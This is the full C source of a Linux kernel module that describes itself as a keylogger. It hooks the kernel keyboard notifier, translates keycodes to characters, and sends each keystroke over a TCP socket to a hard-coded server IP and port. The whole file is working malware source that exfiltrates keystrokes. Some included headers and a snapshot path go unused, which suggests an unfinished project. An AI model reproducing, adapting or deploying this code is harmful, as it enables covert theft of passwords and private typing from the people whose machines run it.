#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/fb.h>
#include <linux/screen_info.h>
#include <linux/uaccess.h>

#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/screen_info.h>
#include <linux/fb.h>
#include <linux/vmalloc.h>
#include <linux/uaccess.h>

#include <linux/fs.h>
#include <linux/file.h>
#include <linux/fs_struct.h>
#include <linux/path.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Leonardo, Carlos Henrique, Henrique");
MODULE_DESCRIPTION("Keylogger with Socket and Framebuffer");

#define SERVER_IP "192.168.0.246"
#define SERVER_PORT 8011
#define BUFFER_SIZE 30
#define PATH "/home/lucas/Downloads/modulo/snapshot.bin"

char buffer[BUFFER_SIZE];


struct socket *sock;


char keycodeToChar(int keycode) {
    switch (keycode) {
        case 16: return 'q';
        case 17: return 'w';
        case 18: return 'e';
        case 19: return 'r';
        case 20: return 't';
        case 21: return 'y';
        case 22: return 'u';
        case 23: return 'i';
        case 24: return 'o';
        case 25: return 'p';
        case 30: return 'a';
        case 31: return 's';
        case 32: return 'd';
        case 33: return 'f';
        case 34: return 'g';
        case 35: return 'h';
        case 36: return 'j';
        case 37: return 'k';
        case 38: return 'l';
        case 44: return 'z';
        case 45: return 'x';
        case 46: return 'c';
        case 47: return 'v';
        case 48: return 'b';
        case 49: return 'n';
        case 50: return 'm';
        case 28: return '\n';
        case 57: return '\t';
        case 51: return ',';
        case 78: return '+';
        case 55: return '*';
        case 98: return '/';
        case 13: return '=';
        case 39: return ';';
        case 11:
        case 82: return '0';
        case 2:
        case 79: return '1';
        case 3:
        case 80: return '2';
        case 4:
        case 81: return '3';
        case 5:
        case 75: return '4';
        case 6:
        case 76: return '5';
        case 7:
        case 77: return '6';
        case 8:
        case 71: return '7';
        case 9:
        case 72: return '8';
        case 10:
        case 73: return '9';
        case 12:
        case 74: return '-';
        case 83:
        case 52: return '.';
        default: return '\0'; // Caractere nulo para códigos não mapeados
    }
}
int send_keycode(int keycode) {
    if (!sock)
        return -1;

    char character = keycodeToChar(keycode);
    if (character == '\0')
        return 0;

    snprintf(buffer, BUFFER_SIZE, "%c", character);

    struct kvec vec;
    struct msghdr msg;

    vec.iov_base = (void *)buffer;
    vec.iov_len = strlen(buffer) + 1;

    memset(&msg, 0, sizeof(msg));
    msg.msg_name = NULL;
    msg.msg_namelen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;

    int ret = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
    if (ret < 0) {
        printk(KERN_INFO "Failed to send keycode to the server.\n");
        return -1;
    }

    return 0;
}

int hello_keycode(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE) {
        if (param->down) {
            int keycode = param->value;
            send_keycode(keycode);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = hello_keycode
};

static int __init start(void) {
    // Create a socket
    int ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0) {
        printk(KERN_INFO "Can't create a socket.\n");
        return ret;
    }

    // Set up server address
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = in_aton(SERVER_IP);
    server_addr.sin_port = htons(SERVER_PORT);

    // Connect to the server
    ret = sock->ops->connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    if (ret < 0) {
        printk(KERN_INFO "Can't connect to the server.\n");
        sock_release(sock);
        return ret;
    }

    // Register the keyboard notifier
    register_keyboard_notifier(&nb);

    printk(KERN_INFO "Keylogger started.\n");

    return 0;
}

static void __exit end(void) {
    // Unregister the keyboard notifier
    unregister_keyboard_notifier(&nb);

    // Close the socket
    if (sock) {
        kernel_sock_shutdown(sock, SHUT_RDWR);
        sock_release(sock);
        sock = NULL;
    }

    printk(KERN_INFO "Keylogger stopped.\n");
}

module_init(start);
module_exit(end);
